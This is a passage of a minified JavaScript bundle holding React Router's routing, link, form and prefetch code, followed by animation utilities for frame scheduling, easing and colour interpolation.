0?t.error:e.error,location:e.location,revalidation:t.revalidation||e.revalidation}}componentDidCatch(t,e){this.props.unstable_onError?this.props.unstable_onError(t,e):console.error("React Router caught the following error during render",t)}render(){return this.state.error!==void 0?S.createElement(Tn.Provider,{value:this.props.routeContext},S.createElement(xm.Provider,{value:this.state.error,children:this.props.component})):this.props.children}};function j2({routeContext:t,match:e,children:n}){let r=S.useContext(Ls);return r&&r.static&&r.staticContext&&(e.route.errorElement||e.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=e.route.id),S.createElement(Tn.Provider,{value:t},n)}function F2(t,e=[],n=null,r=null,i=null){if(t==null){if(!n)return null;if(n.errors)t=n.matches;else if(e.length===0&&!n.initialized&&n.matches.length>0)t=n.matches;else return null}let s=t,o=n==null?void 0:n.errors;if(o!=null){let u=s.findIndex(c=>c.route.id&&(o==null?void 0:o[c.route.id])!==void 0);fe(u>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(o).join(",")}`),s=s.slice(0,Math.min(s.length,u+1))}let a=!1,l=-1;if(n)for(let u=0;u<s.length;u++){let c=s[u];if((c.route.HydrateFallback||c.route.hydrateFallbackElement)&&(l=u),c.route.id){let{loaderData:d,errors:f}=n,h=c.route.loader&&!d.hasOwnProperty(c.route.id)&&(!f||f[c.route.id]===void 0);if(c.route.lazy||h){a=!0,l>=0?s=s.slice(0,l+1):s=[s[0]];break}}}return s.reduceRight((u,c,d)=>{let f,h=!1,p=null,y=null;n&&(f=o&&c.route.id?o[c.route.id]:void 0,p=c.route.errorElement||L2,a&&(l<0&&d===0?(FS("route-fallback",!1,"No `HydrateFallback` element provided to render during initial hydration"),h=!0,y=null):l===d&&(h=!0,y=c.route.hydrateFallbackElement||null)));let x=e.concat(s.slice(0,d+1)),g=()=>{let v;return f?v=p:h?v=y:c.route.Component?v=S.createElement(c.route.Component,null):c.route.element?v=c.route.element:v=u,S.createElement(j2,{match:c,routeContext:{outlet:u,matches:x,isDataRoute:n!=null},children:v})};return n&&(c.route.ErrorBoundary||c.route.errorElement||d===0)?S.createElement(I2,{location:n.location,revalidation:n.revalidation,component:p,error:f,children:g(),routeContext:{outlet:null,matches:x,isDataRoute:!0},unstable_onError:r}):g()},null)}function wm(t){return`${t} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function B2(t){let e=S.useContext(Ls);return fe(e,wm(t)),e}function V2(t){let e=S.useContext(Rc);return fe(e,wm(t)),e}function z2(t){let e=S.useContext(Tn);return fe(e,wm(t)),e}function Sm(t){let e=z2(t),n=e.matches[e.matches.length-1];return fe(n.route.id,`${t} can only be used on routes that contain a unique "id"`),n.route.id}function _2(){return Sm("useRouteId")}function $2(){var r;let t=S.useContext(xm),e=V2("useRouteError"),n=Sm("useRouteError");return t!==void 0?t:(r=e.errors)==null?void 0:r[n]}function H2(){let{router:t}=B2("useNavigate"),e=Sm("useNavigate"),n=S.useRef(!1);return IS(()=>{n.current=!0}),S.useCallback(async(i,s={})=>{kn(n.current,LS),n.current&&(typeof i=="number"?t.navigate(i):await t.navigate(i,{fromRouteId:e,...s}))},[t,e])}var c0={};function FS(t,e,n){!e&&!c0[t]&&(c0[t]=!0,kn(!1,n))}S.memo(U2);function U2({routes:t,future:e,state:n,unstable_onError:r}){return jS(t,void 0,n,r,e)}function Zn(t){fe(!1,"A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")}function W2({basename:t="/",children:e=null,location:n,navigationType:r="POP",navigator:i,static:s=!1}){fe(!Ma(),"You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");let o=t.replace(/^\/*/,"/"),a=S.useMemo(()=>({basename:o,navigator:i,static:s,future:{}}),[o,i,s]);typeof n=="string"&&(n=Ds(n));let{pathname:l="/",search:u="",hash:c="",state:d=null,key:f="default"}=n,h=S.useMemo(()=>{let p=Wn(l,o);return p==null?null:{location:{pathname:p,search:u,hash:c,state:d,key:f},navigationType:r}},[o,l,u,c,d,f,r]);return kn(h!=null,`<Router basename="${o}"> is not able to match the URL "${l}${u}${c}" because it does not start with the basename, so the <Router> won't render anything.`),h==null?null:S.createElement(En.Provider,{value:a},S.createElement(Ta.Provider,{children:e,value:h}))}function K2({children:t,location:e}){return O2(wh(t),e)}function wh(t,e=[]){let n=[];return S.Children.forEach(t,(r,i)=>{if(!S.isValidElement(r))return;let s=[...e,i];if(r.type===S.Fragment){n.push.apply(n,wh(r.props.children,s));return}fe(r.type===Zn,`[${typeof r.type=="string"?r.type:r.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),fe(!r.props.index||!r.props.children,"An index route cannot have child routes.");let o={id:r.props.id||s.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,loader:r.props.loader,action:r.props.action,hydrateFallbackElement:r.props.hydrateFallbackElement,HydrateFallback:r.props.HydrateFallback,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.hasErrorBoundary===!0||r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(o.children=wh(r.props.children,s)),n.push(o)}),n}var Ll="get",Il="application/x-www-form-urlencoded";function Oc(t){return t!=null&&typeof t.tagName=="string"}function q2(t){return Oc(t)&&t.tagName.toLowerCase()==="button"}function G2(t){return Oc(t)&&t.tagName.toLowerCase()==="form"}function J2(t){return Oc(t)&&t.tagName.toLowerCase()==="input"}function Y2(t){return!!(t.metaKey||t.altKey||t.ctrlKey||t.shiftKey)}function Q2(t,e){return t.button===0&&(!e||e==="_self")&&!Y2(t)}var ol=null;function X2(){if(ol===null)try{new FormData(document.createElement("form"),0),ol=!1}catch{ol=!0}return ol}var Z2=new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);function Dd(t){return t!=null&&!Z2.has(t)?(kn(!1,`"${t}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Il}"`),null):t}function eA(t,e){let n,r,i,s,o;if(G2(t)){let a=t.getAttribute("action");r=a?Wn(a,e):null,n=t.getAttribute("method")||Ll,i=Dd(t.getAttribute("enctype"))||Il,s=new FormData(t)}else if(q2(t)||J2(t)&&(t.type==="submit"||t.type==="image")){let a=t.form;if(a==null)throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');let l=t.getAttribute("formaction")||a.getAttribute("action");if(r=l?Wn(l,e):null,n=t.getAttribute("formmethod")||a.getAttribute("method")||Ll,i=Dd(t.getAttribute("formenctype"))||Dd(a.getAttribute("enctype"))||Il,s=new FormData(a,t),!X2()){let{name:u,type:c,value:d}=t;if(c==="image"){let f=u?`${u}.`:"";s.append(`${f}x`,"0"),s.append(`${f}y`,"0")}else u&&s.append(u,d)}}else{if(Oc(t))throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');n=Ll,r=null,i=Il,o=t}return s&&i==="text/plain"&&(o=s,s=void 0),{action:r,method:n.toLowerCase(),encType:i,formData:s,body:o}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");function km(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function tA(t,e,n){let r=typeof t=="string"?new URL(t,typeof window>"u"?"server://singlefetch/":window.location.origin):t;return r.pathname==="/"?r.pathname=`_root.${n}`:e&&Wn(r.pathname,e)==="/"?r.pathname=`${e.replace(/\/$/,"")}/_root.${n}`:r.pathname=`${r.pathname.replace(/\/$/,"")}.${n}`,r}async function nA(t,e){if(t.id in e)return e[t.id];try{let n=await import(t.module);return e[t.id]=n,n}catch(n){return console.error(`Error loading route module \`${t.module}\`, reloading page...`),console.error(n),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function rA(t){return t==null?!1:t.href==null?t.rel==="preload"&&typeof t.imageSrcSet=="string"&&typeof t.imageSizes=="string":typeof t.rel=="string"&&typeof t.href=="string"}async function iA(t,e,n){let r=await Promise.all(t.map(async i=>{let s=e.routes[i.route.id];if(s){let o=await nA(s,n);return o.links?o.links():[]}return[]}));return lA(r.flat(1).filter(rA).filter(i=>i.rel==="stylesheet"||i.rel==="preload").map(i=>i.rel==="stylesheet"?{...i,rel:"prefetch",as:"style"}:{...i,rel:"prefetch"}))}function d0(t,e,n,r,i,s){let o=(l,u)=>n[u]?l.route.id!==n[u].route.id:!0,a=(l,u)=>{var c;return n[u].pathname!==l.pathname||((c=n[u].route.path)==null?void 0:c.endsWith("*"))&&n[u].params["*"]!==l.params["*"]};return s==="assets"?e.filter((l,u)=>o(l,u)||a(l,u)):s==="data"?e.filter((l,u)=>{var d;let c=r.routes[l.route.id];if(!c||!c.hasLoader)return!1;if(o(l,u)||a(l,u))return!0;if(l.route.shouldRevalidate){let f=l.route.shouldRevalidate({currentUrl:new URL(i.pathname+i.search+i.hash,window.origin),currentParams:((d=n[0])==null?void 0:d.params)||{},nextUrl:new URL(t,window.origin),nextParams:l.params,defaultShouldRevalidate:!0});if(typeof f=="boolean")return f}return!0}):[]}function sA(t,e,{includeHydrateFallback:n}={}){return oA(t.map(r=>{let i=e.routes[r.route.id];if(!i)return[];let s=[i.module];return i.clientActionModule&&(s=s.concat(i.clientActionModule)),i.clientLoaderModule&&(s=s.concat(i.clientLoaderModule)),n&&i.hydrateFallbackModule&&(s=s.concat(i.hydrateFallbackModule)),i.imports&&(s=s.concat(i.imports)),s}).flat(1))}function oA(t){return[...new Set(t)]}function aA(t){let e={},n=Object.keys(t).sort();for(let r of n)e[r]=t[r];return e}function lA(t,e){let n=new Set;return new Set(e),t.reduce((r,i)=>{let s=JSON.stringify(aA(i));return n.has(s)||(n.add(s),r.push({key:s,link:i})),r},[])}function BS(){let t=S.useContext(Ls);return km(t,"You must render this element inside a <DataRouterContext.Provider> element"),t}function uA(){let t=S.useContext(Rc);return km(t,"You must render this element inside a <DataRouterStateContext.Provider> element"),t}var bm=S.createContext(void 0);bm.displayName="FrameworkContext";function VS(){let t=S.useContext(bm);return km(t,"You must render this element inside a <HydratedRouter> element"),t}function cA(t,e){let n=S.useContext(bm),[r,i]=S.useState(!1),[s,o]=S.useState(!1),{onFocus:a,onBlur:l,onMouseEnter:u,onMouseLeave:c,onTouchStart:d}=e,f=S.useRef(null);S.useEffect(()=>{if(t==="render"&&o(!0),t==="viewport"){let y=g=>{g.forEach(v=>{o(v.isIntersecting)})},x=new IntersectionObserver(y,{threshold:.5});return f.current&&x.observe(f.current),()=>{x.disconnect()}}},[t]),S.useEffect(()=>{if(r){let y=setTimeout(()=>{o(!0)},100);return()=>{clearTimeout(y)}}},[r]);let h=()=>{i(!0)},p=()=>{i(!1),o(!1)};return n?t!=="intent"?[s,f,{}]:[s,f,{onFocus:Xs(a,h),onBlur:Xs(l,p),onMouseEnter:Xs(u,h),onMouseLeave:Xs(c,p),onTouchStart:Xs(d,h)}]:[!1,f,{}]}function Xs(t,e){return n=>{t&&t(n),n.defaultPrevented||e(n)}}function dA({page:t,...e}){let{router:n}=BS(),r=S.useMemo(()=>MS(n.routes,t,n.basename),[n.routes,t,n.basename]);return r?S.createElement(hA,{page:t,matches:r,...e}):null}function fA(t){let{manifest:e,routeModules:n}=VS(),[r,i]=S.useState([]);return S.useEffect(()=>{let s=!1;return iA(t,e,n).then(o=>{s||i(o)}),()=>{s=!0}},[t,e,n]),r}function hA({page:t,matches:e,...n}){let r=Ni(),{manifest:i,routeModules:s}=VS(),{basename:o}=BS(),{loaderData:a,matches:l}=uA(),u=S.useMemo(()=>d0(t,e,l,i,r,"data"),[t,e,l,i,r]),c=S.useMemo(()=>d0(t,e,l,i,r,"assets"),[t,e,l,i,r]),d=S.useMemo(()=>{if(t===r.pathname+r.search+r.hash)return[];let p=new Set,y=!1;if(e.forEach(g=>{var w;let v=i.routes[g.route.id];!v||!v.hasLoader||(!u.some(b=>b.route.id===g.route.id)&&g.route.id in a&&((w=s[g.route.id])!=null&&w.shouldRevalidate)||v.hasClientLoader?y=!0:p.add(g.route.id))}),p.size===0)return[];let x=tA(t,o,"data");return y&&p.size>0&&x.searchParams.set("_routes",e.filter(g=>p.has(g.route.id)).map(g=>g.route.id).join(",")),[x.pathname+x.search]},[o,a,r,i,u,e,t,s]),f=S.useMemo(()=>sA(c,i),[c,i]),h=fA(c);return S.createElement(S.Fragment,null,d.map(p=>S.createElement("link",{key:p,rel:"prefetch",as:"fetch",href:p,...n})),f.map(p=>S.createElement("link",{key:p,rel:"modulepreload",href:p,...n})),h.map(({key:p,link:y})=>S.createElement("link",{key:p,nonce:n.nonce,...y})))}function pA(...t){return e=>{t.forEach(n=>{typeof n=="function"?n(e):n!=null&&(n.current=e)})}}var zS=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";try{zS&&(window.__reactRouterVersion="7.8.2")}catch{}function mA({basename:t,children:e,window:n}){let r=S.useRef();r.current==null&&(r.current=r2({window:n,v5Compat:!0}));let i=r.current,[s,o]=S.useState({action:i.action,location:i.location}),a=S.useCallback(l=>{S.startTransition(()=>o(l))},[o]);return S.useLayoutEffect(()=>i.listen(a),[i,a]),S.createElement(W2,{basename:t,children:e,location:s.location,navigationType:s.action,navigator:i})}var _S=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,$S=S.forwardRef(function({onClick:e,discover:n="render",prefetch:r="none",relative:i,reloadDocument:s,replace:o,state:a,target:l,to:u,preventScrollReset:c,viewTransition:d,...f},h){let{basename:p}=S.useContext(En),y=typeof u=="string"&&_S.test(u),x,g=!1;if(typeof u=="string"&&y&&(x=u,zS))try{let N=new URL(window.location.href),O=u.startsWith("//")?new URL(N.protocol+u):new URL(u),H=Wn(O.pathname,p);O.origin===N.origin&&H!=null?u=H+O.search+O.hash:g=!0}catch{kn(!1,`<Link to="${u}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}let v=P2(u,{relative:i}),[w,b,k]=cA(r,f),E=vA(u,{replace:o,state:a,target:l,preventScrollReset:c,relative:i,viewTransition:d});function M(N){e&&e(N),N.defaultPrevented||E(N)}let C=S.createElement("a",{...f,...k,href:x||v,onClick:g||s?e:M,ref:pA(h,b),target:l,"data-discover":!y&&n==="render"?"true":void 0});return w&&!y?S.createElement(S.Fragment,null,C,S.createElement(dA,{page:v})):C});$S.displayName="Link";var gA=S.forwardRef(function({"aria-current":e="page",caseSensitive:n=!1,className:r="",end:i=!1,style:s,to:o,viewTransition:a,children:l,...u},c){let d=Na(o,{relative:u.relative}),f=Ni(),h=S.useContext(Rc),{navigator:p,basename:y}=S.useContext(En),x=h!=null&&CA(d)&&a===!0,g=p.encodeLocation?p.encodeLocation(d).pathname:d.pathname,v=f.pathname,w=h&&h.navigation&&h.navigation.location?h.navigation.location.pathname:null;n||(v=v.toLowerCase(),w=w?w.toLowerCase():null,g=g.toLowerCase()),w&&y&&(w=Wn(w,y)||w);const b=g!=="/"&&g.endsWith("/")?g.length-1:g.length;let k=v===g||!i&&v.startsWith(g)&&v.charAt(b)==="/",E=w!=null&&(w===g||!i&&w.startsWith(g)&&w.charAt(g.length)==="/"),M={isActive:k,isPending:E,isTransitioning:x},C=k?e:void 0,N;typeof r=="function"?N=r(M):N=[r,k?"active":null,E?"pending":null,x?"transitioning":null].filter(Boolean).join(" ");let O=typeof s=="function"?s(M):s;return S.createElement($S,{...u,"aria-current":C,className:N,ref:c,style:O,to:o,viewTransition:a},typeof l=="function"?l(M):l)});gA.displayName="NavLink";var yA=S.forwardRef(({discover:t="render",fetcherKey:e,navigate:n,reloadDocument:r,replace:i,state:s,method:o=Ll,action:a,onSubmit:l,relative:u,preventScrollReset:c,viewTransition:d,...f},h)=>{let p=kA(),y=bA(a,{relative:u}),x=o.toLowerCase()==="get"?"get":"post",g=typeof a=="string"&&_S.test(a),v=w=>{if(l&&l(w),w.defaultPrevented)return;w.preventDefault();let b=w.nativeEvent.submitter,k=(b==null?void 0:b.getAttribute("formmethod"))||o;p(b||w.currentTarget,{fetcherKey:e,method:k,navigate:n,replace:i,state:s,relative:u,preventScrollReset:c,viewTransition:d})};return S.createElement("form",{ref:h,method:x,action:y,onSubmit:r?l:v,...f,"data-discover":!g&&t==="render"?"true":void 0})});yA.displayName="Form";function xA(t){return`${t} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function HS(t){let e=S.useContext(Ls);return fe(e,xA(t)),e}function vA(t,{target:e,replace:n,state:r,preventScrollReset:i,relative:s,viewTransition:o}={}){let a=Is(),l=Ni(),u=Na(t,{relative:s});return S.useCallback(c=>{if(Q2(c,e)){c.preventDefault();let d=n!==void 0?n:ea(l)===ea(u);a(t,{replace:d,state:r,preventScrollReset:i,relative:s,viewTransition:o})}},[l,a,u,n,r,e,t,i,s,o])}var wA=0,SA=()=>`__${String(++wA)}__`;function kA(){let{router:t}=HS("useSubmit"),{basename:e}=S.useContext(En),n=_2();return S.useCallback(async(r,i={})=>{let{action:s,method:o,encType:a,formData:l,body:u}=eA(r,e);if(i.navigate===!1){let c=i.fetcherKey||SA();await t.fetch(c,n,i.action||s,{preventScrollReset:i.preventScrollReset,formData:l,body:u,formMethod:i.method||o,formEncType:i.encType||a,flushSync:i.flushSync})}else await t.navigate(i.action||s,{preventScrollReset:i.preventScrollReset,formData:l,body:u,formMethod:i.method||o,formEncType:i.encType||a,replace:i.replace,state:i.state,fromRouteId:n,flushSync:i.flushSync,viewTransition:i.viewTransition})},[t,e,n])}function bA(t,{relative:e}={}){let{basename:n}=S.useContext(En),r=S.useContext(Tn);fe(r,"useFormAction must be used inside a RouteContext");let[i]=r.matches.slice(-1),s={...Na(t||".",{relative:e})},o=Ni();if(t==null){s.search=o.search;let a=new URLSearchParams(s.search),l=a.getAll("index");if(l.some(c=>c==="")){a.delete("index"),l.filter(d=>d).forEach(d=>a.append("index",d));let c=a.toString();s.search=c?`?${c}`:""}}return(!t||t===".")&&i.route.index&&(s.search=s.search?s.search.replace(/^\?/,"?index&"):"?index"),n!=="/"&&(s.pathname=s.pathname==="/"?n:Vn([n,s.pathname])),ea(s)}function CA(t,{relative:e}={}){let n=S.useContext(DS);fe(n!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:r}=HS("useViewTransitionState"),i=Na(t,{relative:e});if(!n.isTransitioning)return!1;let s=Wn(n.currentLocation.pathname,r)||n.currentLocation.pathname,o=Wn(n.nextLocation.pathname,r)||n.nextLocation.pathname;return xu(i.pathname,o)!=null||xu(i.pathname,s)!=null}const Cm=S.createContext({});function Em(t){const e=S.useRef(null);return e.current===null&&(e.current=t()),e.current}const Tm=typeof window<"u",US=Tm?S.useLayoutEffect:S.useEffect,Dc=S.createContext(null);function Mm(t,e){t.indexOf(e)===-1&&t.push(e)}function Nm(t,e){const n=t.indexOf(e);n>-1&&t.splice(n,1)}const Kn=(t,e,n)=>n>e?e:n<t?t:n;let vu=()=>{};const qn={},WS=t=>/^-?(?:\d+(?:\.\d+)?|\.\d+)$/u.test(t);function KS(t){return typeof t=="object"&&t!==null}const qS=t=>/^0[^.\s]+$/u.test(t);function Am(t){let e;return()=>(e===void 0&&(e=t()),e)}const Ut=t=>t,EA=(t,e)=>n=>e(t(n)),Aa=(...t)=>t.reduce(EA),ta=(t,e,n)=>{const r=e-t;return r===0?1:(n-t)/r};class Pm{constructor(){this.subscriptions=[]}add(e){return Mm(this.subscriptions,e),()=>Nm(this.subscriptions,e)}notify(e,n,r){const i=this.subscriptions.length;if(i)if(i===1)this.subscriptions[0](e,n,r);else for(let s=0;s<i;s++){const o=this.subscriptions[s];o&&o(e,n,r)}}getSize(){return this.subscriptions.length}clear(){this.subscriptions.length=0}}const vn=t=>t*1e3,wn=t=>t/1e3;function GS(t,e){return e?t*(1e3/e):0}const JS=(t,e,n)=>(((1-3*n+3*e)*t+(3*n-6*e))*t+3*e)*t,TA=1e-7,MA=12;function NA(t,e,n,r,i){let s,o,a=0;do o=e+(n-e)/2,s=JS(o,r,i)-t,s>0?n=o:e=o;while(Math.abs(s)>TA&&++a<MA);return o}function Pa(t,e,n,r){if(t===e&&n===r)return Ut;const i=s=>NA(s,0,1,t,n);return s=>s===0||s===1?s:JS(i(s),e,r)}const YS=t=>e=>e<=.5?t(2*e)/2:(2-t(2*(1-e)))/2,QS=t=>e=>1-t(1-e),XS=Pa(.33,1.53,.69,.99),Rm=QS(XS),ZS=YS(Rm),ek=t=>(t*=2)<1?.5*Rm(t):.5*(2-Math.pow(2,-10*(t-1))),Om=t=>1-Math.sin(Math.acos(t)),tk=QS(Om),nk=YS(Om),AA=Pa(.42,0,1,1),PA=Pa(0,0,.58,1),rk=Pa(.42,0,.58,1),RA=t=>Array.isArray(t)&&typeof t[0]!="number",ik=t=>Array.isArray(t)&&typeof t[0]=="number",f0={linear:Ut,easeIn:AA,easeInOut:rk,easeOut:PA,circIn:Om,circInOut:nk,circOut:tk,backIn:Rm,backInOut:ZS,backOut:XS,anticipate:ek},OA=t=>typeof t=="string",h0=t=>{if(ik(t)){vu(t.length===4);const[e,n,r,i]=t;return Pa(e,n,r,i)}else if(OA(t))return vu(f0[t]!==void 0),f0[t];return t},al=["setup","read","resolveKeyframes","preUpdate","update","preRender","render","postRender"],p0={value:null,addProjectionMetrics:null};function DA(t,e){let n=new Set,r=new Set,i=!1,s=!1;const o=new WeakSet;let a={delta:0,timestamp:0,isProcessing:!1},l=0;function u(d){o.has(d)&&(c.schedule(d),t()),l++,d(a)}const c={schedule:(d,f=!1,h=!1)=>{const y=h&&i?n:r;return f&&o.add(d),y.has(d)||y.add(d),d},cancel:d=>{r.delete(d),o.delete(d)},process:d=>{if(a=d,i){s=!0;return}i=!0,[n,r]=[r,n],n.forEach(u),e&&p0.value&&p0.value.frameloop[e].push(l),l=0,n.clear(),i=!1,s&&(s=!1,c.process(d))}};return c}const LA=40;function sk(t,e){let n=!1,r=!0;const i={delta:0,timestamp:0,isProcessing:!1},s=()=>n=!0,o=al.reduce((w,b)=>(w[b]=DA(s,e?b:void 0),w),{}),{setup:a,read:l,resolveKeyframes:u,preUpdate:c,update:d,preRender:f,render:h,postRender:p}=o,y=()=>{const w=qn.useManualTiming?i.timestamp:performance.now();n=!1,qn.useManualTiming||(i.delta=r?1e3/60:Math.max(Math.min(w-i.timestamp,LA),1)),i.timestamp=w,i.isProcessing=!0,a.process(i),l.process(i),u.process(i),c.process(i),d.process(i),f.process(i),h.process(i),p.process(i),i.isProcessing=!1,n&&e&&(r=!1,t(y))},x=()=>{n=!0,r=!0,i.isProcessing||t(y)};return{schedule:al.reduce((w,b)=>{const k=o[b];return w[b]=(E,M=!1,C=!1)=>(n||x(),k.schedule(E,M,C)),w},{}),cancel:w=>{for(let b=0;b<al.length;b++)o[al[b]].cancel(w)},state:i,steps:o}}const{schedule:oe,cancel:Rr,state:He,steps:Ld}=sk(typeof requestAnimationFrame<"u"?requestAnimationFrame:Ut,!0);let jl;function IA(){jl=void 0}const gt={now:()=>(jl===void 0&&gt.set(He.isProcessing||qn.useManualTiming?He.timestamp:performance.now()),jl),set:t=>{jl=t,queueMicrotask(IA)}},ok=t=>e=>typeof e=="string"&&e.startsWith(t),Dm=ok("--"),jA=ok("var(--"),Lm=t=>jA(t)?FA.test(t.split("/*")[0].trim()):!1,FA=/var\(--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)$/iu,js={test:t=>typeof t=="number",parse:parseFloat,transform:t=>t},na={...js,transform:t=>Kn(0,1,t)},ll={...js,default:1},ko=t=>Math.round(t*1e5)/1e5,Im=/-?(?:\d+(?:\.\d+)?|\.\d+)/gu;function BA(t){return t==null}const VA=/^(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))$/iu,jm=(t,e)=>n=>!!(typeof n=="string"&&VA.test(n)&&n.startsWith(t)||e&&!BA(n)&&Object.prototype.hasOwnProperty.call(n,e)),ak=(t,e,n)=>r=>{if(typeof r!="string")return r;const[i,s,o,a]=r.match(Im);return{[t]:parseFloat(i),[e]:parseFloat(s),[n]:parseFloat(o),alpha:a!==void 0?parseFloat(a):1}},zA=t=>Kn(0,255,t),Id={...js,transform:t=>Math.round(zA(t))},Qr={test:jm("rgb","red"),parse:ak("red","green","blue"),transform:({red:t,green:e,blue:n,alpha:r=1})=>"rgba("+Id.transform(t)+", "+Id.transform(e)+", "+Id.transform(n)+", "+ko(na.transform(r))+")"};function _A(t){let e="",n="",r="",i="";return t.length>5?(e=t.substring(1,3),n=t.substring(3,5),r=t.substring(5,7),i=t.substring(7,9)):(e=t.substring(1,2),n=t.substring(2,3),r=t.substring(3,4),i=t.substring(4,5),e+=e,n+=n,r+=r,i+=i),{red:parseInt(e,16),green:parseInt(n,16),blue:parseInt(r,16),alpha:i?parseInt(i,16)/255:1}}const Sh={test:jm("#"),parse:_A,transform:Qr.transform},Ra=t=>({test:e=>typeof e=="string"&&e.endsWith(t)&&e.split(" ").length===1,parse:parseFloat,transform:e=>`${e}${t}`}),er=Ra("deg"),Sn=Ra("%"),_=Ra("px"),$A=Ra("vh"),HA=Ra("vw"),m0={...Sn,parse:t=>Sn.parse(t)/100,transform:t=>Sn.transform(t*100)},Yi={test:jm("hsl","hue"),parse:ak("hue","saturation","lightness"),transform:({hue:t,saturation:e,lightness:n,alpha:r=1})=>"hsla("+Math.round(t)+", "+Sn.transform(ko(e))+", "+Sn.transform(ko(n))+", "+ko(na.transform(r))+")"},Ce={test:t=>Qr.test(t)||Sh.test(t)||Yi.test(t),parse:t=>Qr.test(t)?Qr.parse(t):Yi.test(t)?Yi.parse(t):Sh.parse(t),transform:t=>typeof t=="string"?t:t.hasOwnProperty("red")?Qr.transform(t):Yi.transform(t),getAnimatableNone:t=>{const e=Ce.parse(t);return e.alpha=0,Ce.transform(e)}},UA=/(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))/giu;function WA(t){var e,n;return isNaN(t)&&typeof t=="string"&&(((e=t.match(Im))==null?void 0:e.length)||0)+(((n=t.match(UA))==null?void 0:n.length)||0)>0}const lk="number",uk="color",KA="var",qA="var(",g0="${}",GA=/var\s*\(\s*--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)|#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\)|-?(?:\d+(?:\.\d+)?|\.\d+)/giu;function ra(t){const e=t.toString(),n=[],r={color:[],number:[],var:[]},i=[];let s=0;const a=e.replace(GA,l=>(Ce.test(l)?(r.color.push(s),i.push(uk),n.push(Ce.parse(l))):l.startsWith(qA)?(r.var.push(s),i.push(KA),n.push(l)):(r.number.push(s),i.push(lk),n.push(parseFloat(l))),++s,g0)).split(g0);return{values:n,split:a,indexes:r,types:i}}function ck(t){return ra(t).values}function dk(t){const{split:e,types:n}=ra(t),r=e.length;return i=>{let s="";for(let o=0;o<r;o++)if(s+=e[o],i[o]!==void 0){const a=n[o];a===lk?s+=ko(i[o]):a===uk?s+=Ce.transform(i[o]):s+=i[o]}return s}}const JA=t=>typeof t=="number"?0:Ce.test(t)?Ce.getAnimatableNone(t):t;function YA(t){const e=ck(t);return dk(t)(e.map(JA))}const Or={test:WA,parse:ck,createTransformer:dk,getAnimatableNone:YA};function jd(t,e,n){return n<0&&(n+=1),n>1&&(n-=1),n<1/6?t+(e-t)*6*n:n<1/2?e:n<2/3?t+(e-t)*(2/3-n)*6:t}function QA({hue:t,saturation:e,lightness:n,alpha:r}){t/=360,e/=100,n/=100;let i=0,s=0,o=0;if(!e)i=s=o=n;else{const a=n<.5?n*(1+e):n+e-n*e,l=2*n-a;i=jd(l,a,t+1/3),s=jd(l,a,t),o=jd(l,a,t-1/3)}return{red:Math.round(i*255),green:Math.round(s*255),blue:Math.round(o*255),alpha:r}}function wu(t,e){return n=>n>0?e:t}const ce=(t,e,n)=>t+(e-t)*n,Fd=(t,e,n)=>{const r=t*t,i=n*(e*e-r)+r;return i<0?0:Math.sqrt(i)},XA=[Sh,Qr,Yi],ZA=t=>XA.find(e=>e.test(t));function y0(t){const e=ZA(t);if(!e)return!1;let n=e.parse(t);return e===Yi&&(n=QA(n)),n}const x0=(t,e)=>{const n=y0(t),r=y0(e);if(!n||!r)return wu(t,e);const i={...n};return s=>(i.red=Fd(n.red,r.red,s),i.green=Fd(n.green,r.green,s),i.blue=Fd(n.blue,r.blue,s),i.alpha=ce(n.alpha,r.alpha,s),Qr.transform(i))},kh=new Set(["none","hidden"]);function eP(t,e){return kh.has(t)?n=>n<=0?t:e:n=>n>=1?e:t}function tP(t,e){return n=>ce(t,e,n)}function Fm(t){return typeof t=="number"?tP:typeof t=="string"?Lm(t)?wu:Ce.test(t)?x0:iP:Array.isArray(t)?fk:typeof t=="object"?Ce.test(t)?x0:nP:wu}function fk(t,e){const n=[...t],r=n.length,i=t.map((s,o)=>Fm(s)(s,e[o]));return s=>{for(let o=0;o<r;o++)n[o]=i[o](s);return n}}function nP(t,e){const n={...t,...e},r={};for(const i in n)t[i]!==void 0&&e[i]!==void 0&&(r[i]=Fm(t[i])(t[i],e[i]));return i=>{for(const s in r)n[s]=r[s](i);return n}}function rP(t,e){const 